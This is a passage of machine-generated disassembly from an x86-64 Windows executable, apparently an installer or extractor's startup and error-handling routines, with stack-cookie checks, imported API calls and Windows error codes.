   140002c95:	74 2c                	je     0x140002cc3
   140002c97:	48 8d 15 a2 6b 00 00 	lea    0x6ba2(%rip),%rdx        # 0x140009840
   140002c9e:	48 8b c8             	mov    %rax,%rcx
   140002ca1:	48 ff 15 b8 65 00 00 	rex.W call *0x65b8(%rip)        # 0x140009260
   140002ca8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002cad:	48 85 c0             	test   %rax,%rax
   140002cb0:	74 11                	je     0x140002cc3
   140002cb2:	45 33 c9             	xor    %r9d,%r9d
   140002cb5:	8d 56 01             	lea    0x1(%rsi),%edx
   140002cb8:	45 33 c0             	xor    %r8d,%r8d
   140002cbb:	33 c9                	xor    %ecx,%ecx
   140002cbd:	ff 15 8d 69 00 00    	call   *0x698d(%rip)        # 0x140009650
   140002cc3:	48 8b d3             	mov    %rbx,%rdx
   140002cc6:	89 35 78 a8 00 00    	mov    %esi,0xa878(%rip)        # 0x14000d544
   140002ccc:	48 8b cf             	mov    %rdi,%rcx
   140002ccf:	e8 e0 00 00 00       	call   0x140002db4
   140002cd4:	85 c0                	test   %eax,%eax
   140002cd6:	0f 84 a3 00 00 00    	je     0x140002d7f
   140002cdc:	e8 0b 04 00 00       	call   0x1400030ec
   140002ce1:	8b d8                	mov    %eax,%ebx
   140002ce3:	e8 04 35 00 00       	call   0x1400061ec
   140002ce8:	85 db                	test   %ebx,%ebx
   140002cea:	0f 84 8f 00 00 00    	je     0x140002d7f
   140002cf0:	40 38 35 23 a0 00 00 	cmp    %sil,0xa023(%rip)        # 0x14000cd1a
   140002cf7:	0f 85 82 00 00 00    	jne    0x140002d7f
   140002cfd:	8b 3d 59 b1 00 00    	mov    0xb159(%rip),%edi        # 0x14000de5c
   140002d03:	40 f6 c7 01          	test   $0x1,%dil
   140002d07:	74 76                	je     0x140002d7f
   140002d09:	40 f6 c7 02          	test   $0x2,%dil
   140002d0d:	75 1e                	jne    0x140002d2d
   140002d0f:	39 35 2b a8 00 00    	cmp    %esi,0xa82b(%rip)        # 0x14000d540
   140002d15:	75 16                	jne    0x140002d2d
   140002d17:	0f b7 0d 5a b1 00 00 	movzwl 0xb15a(%rip),%ecx        # 0x14000de78
   140002d1e:	8b 1d 58 b1 00 00    	mov    0xb158(%rip),%ebx        # 0x14000de7c
   140002d24:	e8 ef f5 ff ff       	call   0x140002318
   140002d29:	3b d8                	cmp    %eax,%ebx
   140002d2b:	74 52                	je     0x140002d7f
   140002d2d:	40 f6 c7 04          	test   $0x4,%dil
   140002d31:	75 2b                	jne    0x140002d5e
   140002d33:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002d3a:	00 
   140002d3b:	4c 8d 05 be 69 00 00 	lea    0x69be(%rip),%r8        # 0x140009700
   140002d42:	45 33 c9             	xor    %r9d,%r9d
   140002d45:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140002d4c:	00 
   140002d4d:	ba 22 05 00 00       	mov    $0x522,%edx
   140002d52:	33 c9                	xor    %ecx,%ecx
   140002d54:	e8 73 20 00 00       	call   0x140004dcc
   140002d59:	83 f8 06             	cmp    $0x6,%eax
   140002d5c:	75 21                	jne    0x140002d7f
   140002d5e:	66 39 35 13 b1 00 00 	cmp    %si,0xb113(%rip)        # 0x14000de78
   140002d65:	75 13                	jne    0x140002d7a
   140002d67:	33 d2                	xor    %edx,%edx
   140002d69:	8d 4a 02             	lea    0x2(%rdx),%ecx
   140002d6c:	48 ff 15 dd 67 00 00 	rex.W call *0x67dd(%rip)        # 0x140009550
   140002d73:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d78:	eb 05                	jmp    0x140002d7f
   140002d7a:	e8 8d ee ff ff       	call   0x140001c0c
   140002d7f:	48 8b 0d aa 9a 00 00 	mov    0x9aaa(%rip),%rcx        # 0x14000c830
   140002d86:	48 85 c9             	test   %rcx,%rcx
   140002d89:	74 0c                	je     0x140002d97
   140002d8b:	48 ff 15 a6 64 00 00 	rex.W call *0x64a6(%rip)        # 0x140009238
   140002d92:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d97:	8b 05 a7 a7 00 00    	mov    0xa7a7(%rip),%eax        # 0x14000d544
   140002d9d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140002da2:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140002da7:	48 83 c4 30          	add    $0x30,%rsp
   140002dab:	5f                   	pop    %rdi
   140002dac:	c3                   	ret
   140002dad:	cc                   	int3
   140002dae:	cc                   	int3
   140002daf:	cc                   	int3
   140002db0:	cc                   	int3
   140002db1:	cc                   	int3
   140002db2:	cc                   	int3
   140002db3:	cc                   	int3
   140002db4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002db9:	56                   	push   %rsi
   140002dba:	57                   	push   %rdi
   140002dbb:	41 56                	push   %r14
   140002dbd:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140002dc4:	48 8b 05 3d 92 00 00 	mov    0x923d(%rip),%rax        # 0x14000c008
   140002dcb:	48 33 c4             	xor    %rsp,%rax
   140002dce:	48 89 84 24 40 01 00 	mov    %rax,0x140(%rsp)
   140002dd5:	00 
   140002dd6:	48 8b f2             	mov    %rdx,%rsi
   140002dd9:	48 89 0d 90 b0 00 00 	mov    %rcx,0xb090(%rip)        # 0x14000de70
   140002de0:	48 8b d9             	mov    %rcx,%rbx
   140002de3:	33 d2                	xor    %edx,%edx
   140002de5:	48 8d 0d 74 a7 00 00 	lea    0xa774(%rip),%rcx        # 0x14000d560
   140002dec:	41 b8 10 09 00 00    	mov    $0x910,%r8d
   140002df2:	33 ff                	xor    %edi,%edi
   140002df4:	e8 10 5d 00 00       	call   0x140008b09
   140002df9:	33 d2                	xor    %edx,%edx
   140002dfb:	48 8d 0d fe 9e 00 00 	lea    0x9efe(%rip),%rcx        # 0x14000cd00
   140002e02:	41 b8 2c 03 00 00    	mov    $0x32c,%r8d
   140002e08:	e8 fc 5c 00 00       	call   0x140008b09
   140002e0d:	33 d2                	xor    %edx,%edx
   140002e0f:	48 8d 0d 8a 9d 00 00 	lea    0x9d8a(%rip),%rcx        # 0x14000cba0
   140002e16:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002e1c:	e8 e8 5c 00 00       	call   0x140008b09
   140002e21:	44 8d 77 01          	lea    0x1(%rdi),%r14d
   140002e25:	44 8d 47 7f          	lea    0x7f(%rdi),%r8d
   140002e29:	44 89 35 e8 a9 00 00 	mov    %r14d,0xa9e8(%rip)        # 0x14000d818
   140002e30:	48 8d 15 41 a7 00 00 	lea    0xa741(%rip),%rdx        # 0x14000d578
   140002e37:	48 8d 0d 16 6a 00 00 	lea    0x6a16(%rip),%rcx        # 0x140009854
   140002e3e:	e8 0d 22 00 00       	call   0x140005050
   140002e43:	ff c8                	dec    %eax
   140002e45:	45 33 c9             	xor    %r9d,%r9d
   140002e48:	33 c9                	xor    %ecx,%ecx
   140002e4a:	83 f8 7f             	cmp    $0x7f,%eax
   140002e4d:	0f 87 52 02 00 00    	ja     0x1400030a5
   140002e53:	45 8b c6             	mov    %r14d,%r8d
   140002e56:	41 8b d6             	mov    %r14d,%edx
   140002e59:	48 ff 15 50 65 00 00 	rex.W call *0x6550(%rip)        # 0x1400093b0
   140002e60:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002e65:	48 8b c8             	mov    %rax,%rcx
   140002e68:	48 89 05 c9 99 00 00 	mov    %rax,0x99c9(%rip)        # 0x14000c838
   140002e6f:	48 ff 15 ca 64 00 00 	rex.W call *0x64ca(%rip)        # 0x140009340
   140002e76:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002e7b:	44 8d 47 04          	lea    0x4(%rdi),%r8d
   140002e7f:	48 8d 15 de af 00 00 	lea    0xafde(%rip),%rdx        # 0x14000de64
   140002e86:	48 8d 0d d3 69 00 00 	lea    0x69d3(%rip),%rcx        # 0x140009860
   140002e8d:	e8 be 21 00 00       	call   0x140005050
   140002e92:	85 c0                	test   %eax,%eax
   140002e94:	75 2d                	jne    0x140002ec3
   140002e96:	21 7c 24 28          	and    %edi,0x28(%rsp)
   140002e9a:	45 33 c9             	xor    %r9d,%r9d
   140002e9d:	45 33 c0             	xor    %r8d,%r8d
   140002ea0:	33 c9                	xor    %ecx,%ecx
   140002ea2:	ba b1 04 00 00       	mov    $0x4b1,%edx
   140002ea7:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002eae:	00 
   140002eaf:	e8 18 1f 00 00       	call   0x140004dcc
   140002eb4:	c7 05 86 a6 00 00 14 	movl   $0x80070714,0xa686(%rip)        # 0x14000d544
   140002ebb:	07 07 80 
   140002ebe:	e9 fb 01 00 00       	jmp    0x1400030be
   140002ec3:	8b 05 9b af 00 00    	mov    0xaf9b(%rip),%eax        # 0x14000de64
   140002ec9:	a8 40                	test   $0x40,%al
   140002ecb:	75 08                	jne    0x140002ed5
   140002ecd:	84 c0                	test   %al,%al
   140002ecf:	0f 89 ce 00 00 00    	jns    0x140002fa3
   140002ed5:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140002edb:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002ee0:	48 8d 0d 89 69 00 00 	lea    0x6989(%rip),%rcx        # 0x140009870
   140002ee7:	e8 64 21 00 00       	call   0x140005050
   140002eec:	33 c9                	xor    %ecx,%ecx
   140002eee:	85 c0                	test   %eax,%eax
   140002ef0:	75 0c                	jne    0x140002efe
   140002ef2:	21 7c 24 28          	and    %edi,0x28(%rsp)
   140002ef6:	45 33 c9             	xor    %r9d,%r9d
   140002ef9:	45 33 c0             	xor    %r8d,%r8d
   140002efc:	eb a4                	jmp    0x140002ea2
   140002efe:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002f03:	41 8b d6             	mov    %r14d,%edx
   140002f06:	48 ff 15 e3 63 00 00 	rex.W call *0x63e3(%rip)        # 0x1400092f0
   140002f0d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f12:	48 89 05 17 99 00 00 	mov    %rax,0x9917(%rip)        # 0x14000c830
   140002f19:	48 85 c0             	test   %rax,%rax
   140002f1c:	0f 84 81 00 00 00    	je     0x140002fa3
   140002f22:	48 ff 15 d7 62 00 00 	rex.W call *0x62d7(%rip)        # 0x140009200
   140002f29:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f2e:	3d b7 00 00 00       	cmp    $0xb7,%eax
   140002f33:	75 6e                	jne    0x140002fa3
   140002f35:	45 33 c9             	xor    %r9d,%r9d
   140002f38:	4c 8d 05 39 a6 00 00 	lea    0xa639(%rip),%r8        # 0x14000d578
   140002f3f:	33 c9                	xor    %ecx,%ecx
   140002f41:	f6 05 1c af 00 00 80 	testb  $0x80,0xaf1c(%rip)        # 0x14000de64
   140002f48:	74 18                	je     0x140002f62
   140002f4a:	21 7c 24 28          	and    %edi,0x28(%rsp)
   140002f4e:	ba 4b 05 00 00       	mov    $0x54b,%edx
   140002f53:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140002f5a:	00 
   140002f5b:	e8 6c 1e 00 00       	call   0x140004dcc
   140002f60:	eb 1f                	jmp    0x140002f81
   140002f62:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002f69:	00 
   140002f6a:	ba 24 05 00 00       	mov    $0x524,%edx
   140002f6f:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   140002f76:	00 
   140002f77:	e8 50 1e 00 00       	call   0x140004dcc
   140002f7c:	83 f8 06             	cmp    $0x6,%eax
   140002f7f:	74 22                	je     0x140002fa3
   140002f81:	48 8b 0d a8 98 00 00 	mov    0x98a8(%rip),%rcx        # 0x14000c830
   140002f88:	48 ff 15 a9 62 00 00 	rex.W call *0x62a9(%rip)        # 0x140009238
   140002f8f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002f94:	c7 05 a6 a5 00 00 b7 	movl   $0x800700b7,0xa5a6(%rip)        # 0x14000d544
   140002f9b:	00 07 80 
   140002f9e:	e9 1b 01 00 00       	jmp    0x1400030be
   140002fa3:	21 3d 97 a5 00 00    	and    %edi,0xa597(%rip)        # 0x14000d540
   140002fa9:	48 8b ce             	mov    %rsi,%rcx
   140002fac:	e8 f7 40 00 00       	call   0x1400070a8
   140002fb1:	85 c0                	test   %eax,%eax
   140002fb3:	75 0f                	jne    0x140002fc4
   140002fb5:	45 33 c9             	xor    %r9d,%r9d
   140002fb8:	ba 20 05 00 00       	mov    $0x520,%edx
   140002fbd:	33 c9                	xor    %ecx,%ecx
   140002fbf:	e9 e6 00 00 00       	jmp    0x1400030aa
   140002fc4:	40 38 3d 4f 9d 00 00 	cmp    %dil,0x9d4f(%rip)        # 0x14000cd1a
   140002fcb:	74 11                	je     0x140002fde
   140002fcd:	48 8d 0d 46 9d 00 00 	lea    0x9d46(%rip),%rcx        # 0x14000cd1a
   140002fd4:	e8 73 f0 ff ff       	call   0x14000204c
   140002fd9:	e9 e0 00 00 00       	jmp    0x1400030be
   140002fde:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140002fe4:	48 8d 15 95 68 00 00 	lea    0x6895(%rip),%rdx        # 0x140009880
   140002feb:	48 8b cb             	mov    %rbx,%rcx
   140002fee:	48 ff 15 f3 62 00 00 	rex.W call *0x62f3(%rip)        # 0x1400092e8
   140002ff5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ffa:	48 85 c0             	test   %rax,%rax
   140002ffd:	74 15                	je     0x140003014
   140002fff:	48 8b d0             	mov    %rax,%rdx
   140003002:	48 8b cb             	mov    %rbx,%rcx
   140003005:	48 ff 15 6c 63 00 00 	rex.W call *0x636c(%rip)        # 0x140009378
   14000300c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003011:	48 8b f8             	mov    %rax,%rdi
   140003014:	83 3d 91 91 00 00 00 	cmpl   $0x0,0x9191(%rip)        # 0x14000c1ac
   14000301b:	74 0c                	je     0x140003029
   14000301d:	48 ff 15 7c 61 00 00 	rex.W call *0x617c(%rip)        # 0x1400091a0
   140003024:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003029:	83 3d d4 9c 00 00 00 	cmpl   $0x0,0x9cd4(%rip)        # 0x14000cd04
   140003030:	74 08                	je     0x14000303a
   140003032:	41 8b c6             	mov    %r14d,%eax
   140003035:	e9 86 00 00 00       	jmp    0x1400030c0
   14000303a:	48 8b cf             	mov    %rdi,%rcx
   14000303d:	e8 b2 0b 00 00       	call   0x140003bf4
   140003042:	85 c0                	test   %eax,%eax
   140003044:	74 78                	je     0x1400030be
   140003046:	0f b7 05 2b ae 00 00 	movzwl 0xae2b(%rip),%eax        # 0x14000de78
   14000304d:	66 41 2b c6          	sub    %r14w,%ax
   140003051:	66 83 f8 02          	cmp    $0x2,%ax
   140003055:	77 db                	ja     0x140003032
   140003057:	f7 05 03 ae 00 00 00 	testl  $0x100,0xae03(%rip)        # 0x14000de64
   14000305e:	01 00 00 
   140003061:	74 cf                	je     0x140003032
   140003063:	44 84 35 ae 9c 00 00 	test   %r14b,0x9cae(%rip)        # 0x14000cd18
   14000306a:	75 c6                	jne    0x140003032
   14000306c:	e8 7b e2 ff ff       	call   0x1400012ec
   140003071:	85 c0                	test   %eax,%eax
   140003073:	75 bd                	jne    0x140003032
   140003075:	48 c7 44 24 28 3e 08 	movq   $0x83e,0x28(%rsp)
   14000307c:	00 00 
   14000307e:	4c 8d 0d 7b e4 ff ff 	lea    -0x1b85(%rip),%r9        # 0x140001500
   140003085:	45 33 c0             	xor    %r8d,%r8d
   140003088:	48 c7 44 24 20 47 05 	movq   $0x547,0x20(%rsp)
   14000308f:	00 00 
   140003091:	ba d6 07 00 00       	mov    $0x7d6,%edx
   140003096:	e8 2d 4a 00 00       	call   0x140007ac8
   14000309b:	48 3d 3d 08 00 00    	cmp    $0x83d,%rax
   1400030a1:	75 1b                	jne    0x1400030be
   1400030a3:	eb 8d                	jmp    0x140003032
   1400030a5:	ba b1 04 00 00       	mov    $0x4b1,%edx
   1400030aa:	21 7c 24 28          	and    %edi,0x28(%rsp)
   1400030ae:	45 33 c0             	xor    %r8d,%r8d
   1400030b1:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400030b8:	00 
   1400030b9:	e8 0e 1d 00 00       	call   0x140004dcc
   1400030be:	33 c0                	xor    %eax,%eax
   1400030c0:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   1400030c7:	00 
   1400030c8:	48 33 cc             	xor    %rsp,%rcx
   1400030cb:	e8 a0 53 00 00       	call   0x140008470
   1400030d0:	48 8b 9c 24 80 01 00 	mov    0x180(%rsp),%rbx
   1400030d7:	00 
   1400030d8:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   1400030df:	41 5e                	pop    %r14
   1400030e1:	5f                   	pop    %rdi
   1400030e2:	5e                   	pop    %rsi
   1400030e3:	c3                   	ret
   1400030e4:	cc                   	int3
   1400030e5:	cc                   	int3
   1400030e6:	cc                   	int3
   1400030e7:	cc                   	int3
   1400030e8:	cc                   	int3
   1400030e9:	cc                   	int3
   1400030ea:	cc                   	int3
   1400030eb:	cc                   	int3
   1400030ec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400030f1:	57                   	push   %rdi
   1400030f2:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   1400030f9:	48 8b 05 08 8f 00 00 	mov    0x8f08(%rip),%rax        # 0x14000c008
   140003100:	48 33 c4             	xor    %rsp,%rax
   140003103:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   14000310a:	00 
   14000310b:	33 ff                	xor    %edi,%edi
   14000310d:	66 39 3d 04 9c 00 00 	cmp    %di,0x9c04(%rip)        # 0x14000cd18
   140003114:	75 2b                	jne    0x140003141
   140003116:	39 3d e8 9b 00 00    	cmp    %edi,0x9be8(%rip)        # 0x14000cd04
   14000311c:	75 16                	jne    0x140003134
   14000311e:	e8 81 2f 00 00       	call   0x1400060a4
   140003123:	85 c0                	test   %eax,%eax
   140003125:	0f 84 0b 01 00 00    	je     0x140003236
   14000312b:	66 39 3d e6 9b 00 00 	cmp    %di,0x9be6(%rip)        # 0x14000cd18
   140003132:	75 0d                	jne    0x140003141
   140003134:	e8 3b 0e 00 00       	call   0x140003f74
   140003139:	85 c0                	test   %eax,%eax
   14000313b:	0f 84 f5 00 00 00    	je     0x140003236
   140003141:	e8 9e 2e 00 00       	call   0x140005fe4
   140003146:	85 c0                	test   %eax,%eax
   140003148:	0f 84 e8 00 00 00    	je     0x140003236
   14000314e:	e8 71 35 00 00       	call   0x1400066c4
   140003153:	85 c0                	test   %eax,%eax
   140003155:	0f 84 db 00 00 00    	je     0x140003236
   14000315b:	bb 05 01 00 00       	mov    $0x105,%ebx
   140003160:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003165:	8b d3                	mov    %ebx,%edx
   140003167:	48 ff 15 a2 60 00 00 	rex.W call *0x60a2(%rip)        # 0x140009210
   14000316e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003173:	4c 8d 05 8e 65 00 00 	lea    0x658e(%rip),%r8        # 0x140009708
   14000317a:	8b d3                	mov    %ebx,%edx
   14000317c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003181:	e8 22 4a 00 00       	call   0x140007ba8
   140003186:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000318b:	48 ff 15 86 60 00 00 	rex.W call *0x6086(%rip)        # 0x140009218
   140003192:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003197:	48 8b d8             	mov    %rax,%rbx
   14000319a:	48 85 c0             	test   %rax,%rax
   14000319d:	74 2a                	je     0x1400031c9
   14000319f:	48 8d 15 ea 66 00 00 	lea    0x66ea(%rip),%rdx        # 0x140009890
   1400031a6:	48 8b c8             	mov    %rax,%rcx
   1400031a9:	48 ff 15 b0 60 00 00 	rex.W call *0x60b0(%rip)        # 0x140009260
   1400031b0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400031b5:	48 85 c0             	test   %rax,%rax
   1400031b8:	74 0f                	je     0x1400031c9
   1400031ba:	33 d2                	xor    %edx,%edx
   1400031bc:	48 8d 0d 4d a4 00 00 	lea    0xa44d(%rip),%rcx        # 0x14000d610
   1400031c3:	ff 15 87 64 00 00    	call   *0x6487(%rip)        # 0x140009650
   1400031c9:	48 8b cb             	mov    %rbx,%rcx
   1400031cc:	48 ff 15 ad 60 00 00 	rex.W call *0x60ad(%rip)        # 0x140009280
   1400031d3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400031d8:	39 3d 26 9b 00 00    	cmp    %edi,0x9b26(%rip)        # 0x14000cd04
   1400031de:	0f 85 8f 00 00 00    	jne    0x140003273
   1400031e4:	39 3d 76 ac 00 00    	cmp    %edi,0xac76(%rip)        # 0x14000de60
   1400031ea:	0f 85 83 00 00 00    	jne    0x140003273
   1400031f0:	ba 04 01 00 00       	mov    $0x104,%edx
   1400031f5:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   1400031fc:	00 
   1400031fd:	48 ff 15 4c 60 00 00 	rex.W call *0x604c(%rip)        # 0x140009250
   140003204:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003209:	85 c0                	test   %eax,%eax
   14000320b:	75 4d                	jne    0x14000325a
   14000320d:	ba f0 04 00 00       	mov    $0x4f0,%edx
   140003212:	45 33 c9             	xor    %r9d,%r9d
   140003215:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140003219:	45 33 c0             	xor    %r8d,%r8d
   14000321c:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003223:	00 
   140003224:	33 c9                	xor    %ecx,%ecx
   140003226:	e8 a1 1b 00 00       	call   0x140004dcc
   14000322b:	e8 d0 44 00 00       	call   0x140007700
   140003230:	89 05 0e a3 00 00    	mov    %eax,0xa30e(%rip)        # 0x14000d544
   140003236:	33 c0                	xor    %eax,%eax
   140003238:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   14000323f:	00 
   140003240:	48 33 cc             	xor    %rsp,%rcx
   140003243:	e8 28 52 00 00       	call   0x140008470
   140003248:	48 8b 9c 24 70 02 00 	mov    0x270(%rsp),%rbx
   14000324f:	00 
   140003250:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   140003257:	5f                   	pop    %rdi
   140003258:	c3                   	ret
   140003259:	cc                   	int3
   14000325a:	ba 02 00 00 00       	mov    $0x2,%edx
   14000325f:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   140003266:	00 
   140003267:	44 8b c2             	mov    %edx,%r8d
   14000326a:	e8 35 3a 00 00       	call   0x140006ca4
   14000326f:	85 c0                	test   %eax,%eax
   140003271:	74 c3                	je     0x140003236
   140003273:	48 8d 0d 96 a3 00 00 	lea    0xa396(%rip),%rcx        # 0x14000d610
   14000327a:	48 ff 15 9f 60 00 00 	rex.W call *0x609f(%rip)        # 0x140009320
   140003281:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003286:	85 c0                	test   %eax,%eax
   140003288:	75 07                	jne    0x140003291
   14000328a:	ba bc 04 00 00       	mov    $0x4bc,%edx
   14000328f:	eb 81                	jmp    0x140003212
   140003291:	39 3d 75 9a 00 00    	cmp    %edi,0x9a75(%rip)        # 0x14000cd0c
   140003297:	0f 85 90 00 00 00    	jne    0x14000332d
   14000329d:	48 8d 05 9c 9d 00 00 	lea    0x9d9c(%rip),%rax        # 0x14000d040
   1400032a4:	b9 28 00 00 00       	mov    $0x28,%ecx
   1400032a9:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400032af:	48 8d 40 20          	lea    0x20(%rax),%rax
   1400032b3:	48 83 e9 01          	sub    $0x1,%rcx
   1400032b7:	75 f0                	jne    0x1400032a9
   1400032b9:	f6 05 58 9a 00 00 01 	testb  $0x1,0x9a58(%rip)        # 0x14000cd18
   1400032c0:	75 39                	jne    0x1400032fb
   1400032c2:	f6 05 9b ab 00 00 01 	testb  $0x1,0xab9b(%rip)        # 0x14000de64
   1400032c9:	75 30                	jne    0x1400032fb
   1400032cb:	8b 05 db 8e 00 00    	mov    0x8edb(%rip),%eax        # 0x14000c1ac
   1400032d1:	4c 8d 0d 38 06 00 00 	lea    0x638(%rip),%r9        # 0x140003910
   1400032d8:	f7 d8                	neg    %eax
   1400032da:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400032df:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400032e4:	48 1b d2             	sbb    %rdx,%rdx
   1400032e7:	45 33 c0             	xor    %r8d,%r8d
   1400032ea:	48 81 c2 d5 07 00 00 	add    $0x7d5,%rdx
   1400032f1:	e8 d2 47 00 00       	call   0x140007ac8
   1400032f6:	48 85 c0             	test   %rax,%rax
   1400032f9:	eb 07                	jmp    0x140003302
   1400032fb:	e8 90 2a 00 00       	call   0x140005d90
   140003300:	85 c0                	test   %eax,%eax
   140003302:	75 0f                	jne    0x140003313
   140003304:	c7 05 36 a2 00 00 2b 	movl   $0x8007042b,0xa236(%rip)        # 0x14000d544
   14000330b:	04 07 80 
   14000330e:	e9 23 ff ff ff       	jmp    0x140003236
   140003313:	48 8d 0d 96 45 00 00 	lea    0x4596(%rip),%rcx        # 0x1400078b0
   14000331a:	e8 0d 44 00 00       	call   0x14000772c
   14000331f:	85 c0                	test   %eax,%eax
   140003321:	0f 84 0f ff ff ff    	je     0x140003236
   140003327:	89 3d 17 a2 00 00    	mov    %edi,0xa217(%rip)        # 0x14000d544
   14000332d:	8b 05 f5 9c 00 00    	mov    0x9cf5(%rip),%eax        # 0x14000d028
   140003333:	a8 40                	test   $0x40,%al
   140003335:	75 12                	jne    0x140003349
   140003337:	84 c0                	test   %al,%al
   140003339:	78 0e                	js     0x140003349
   14000333b:	0f b7 0d 36 ab 00 00 	movzwl 0xab36(%rip),%ecx        # 0x14000de78
   140003342:	e8 d1 ef ff ff       	call   0x140002318
   140003347:	eb 02                	jmp    0x14000334b
   140003349:	8b c7                	mov    %edi,%eax
   14000334b:	89 05 2b ab 00 00    	mov    %eax,0xab2b(%rip)        # 0x14000de7c
   140003351:	8b 05 ad 99 00 00    	mov    0x99ad(%rip),%eax        # 0x14000cd04
   140003357:	85 c0                	test   %eax,%eax
   140003359:	75 1b                	jne    0x140003376
   14000335b:	39 3d ff aa 00 00    	cmp    %edi,0xaaff(%rip)        # 0x14000de60
   140003361:	75 13                	jne    0x140003376
   140003363:	e8 5c 0d 00 00       	call   0x1400040c4
   140003368:	85 c0                	test   %eax,%eax
   14000336a:	0f 84 c6 fe ff ff    	je     0x140003236
   140003370:	8b 05 8e 99 00 00    	mov    0x998e(%rip),%eax        # 0x14000cd04
   140003376:	66 39 3d 9b 99 00 00 	cmp    %di,0x999b(%rip)        # 0x14000cd18
   14000337d:	75 09                	jne    0x140003388
   14000337f:	85 c0                	test   %eax,%eax
   140003381:	75 05                	jne    0x140003388
   140003383:	e8 c4 15 00 00       	call   0x14000494c
   140003388:	b8 01 00 00 00       	mov    $0x1,%eax
   14000338d:	e9 a6 fe ff ff       	jmp    0x140003238
   140003392:	cc                   	int3
   140003393:	cc                   	int3
   140003394:	cc                   	int3
   140003395:	cc                   	int3
   140003396:	cc                   	int3
   140003397:	cc                   	int3
   140003398:	cc                   	int3
   140003399:	cc                   	int3
   14000339a:	cc                   	int3
   14000339b:	cc                   	int3
   14000339c:	cc                   	int3
   14000339d:	cc                   	int3
   14000339e:	cc                   	int3
   14000339f:	cc                   	int3
   1400033a0:	48 83 ec 38          	sub    $0x38,%rsp
   1400033a4:	81 fa b1 00 00 00    	cmp    $0xb1,%edx
   1400033aa:	75 0f                	jne    0x1400033bb
   1400033ac:	4d 85 c0             	test   %r8,%r8
   1400033af:	75 0a                	jne    0x1400033bb
   1400033b1:	49 83 f9 fe          	cmp    $0xfffffffffffffffe,%r9
   1400033b5:	75 04                	jne    0x1400033bb
   1400033b7:	33 c0                	xor    %eax,%eax
   1400033b9:	eb 21                	jmp    0x1400033dc
   1400033bb:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400033c0:	4d 8b c8             	mov    %r8,%r9
   1400033c3:	44 8b c2             	mov    %edx,%r8d
   1400033c6:	48 8b d1             	mov    %rcx,%rdx
   1400033c9:	48 8b 0d c0 97 00 00 	mov    0x97c0(%rip),%rcx        # 0x14000cb90
   1400033d0:	48 ff 15 f1 60 00 00 	rex.W call *0x60f1(%rip)        # 0x1400094c8
   1400033d7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400033dc:	48 83 c4 38          	add    $0x38,%rsp
   1400033e0:	c3                   	ret
   1400033e1:	cc                   	int3
   1400033e2:	cc                   	int3
   1400033e3:	cc                   	int3
   1400033e4:	cc                   	int3
   1400033e5:	cc                   	int3
   1400033e6:	cc                   	int3
   1400033e7:	cc                   	int3
   1400033e8:	cc                   	int3
   1400033e9:	cc                   	int3
   1400033ea:	cc                   	int3
   1400033eb:	cc                   	int3
   1400033ec:	cc                   	int3
   1400033ed:	cc                   	int3
   1400033ee:	cc                   	int3
   1400033ef:	cc                   	int3
   1400033f0:	40 53                	rex push %rbx
   1400033f2:	48 83 ec 30          	sub    $0x30,%rsp
   1400033f6:	48 8b d9             	mov    %rcx,%rbx
   1400033f9:	83 ea 0f             	sub    $0xf,%edx
   1400033fc:	0f 84 ea 00 00 00    	je     0x1400034ec
   140003402:	83 ea 01             	sub    $0x1,%edx
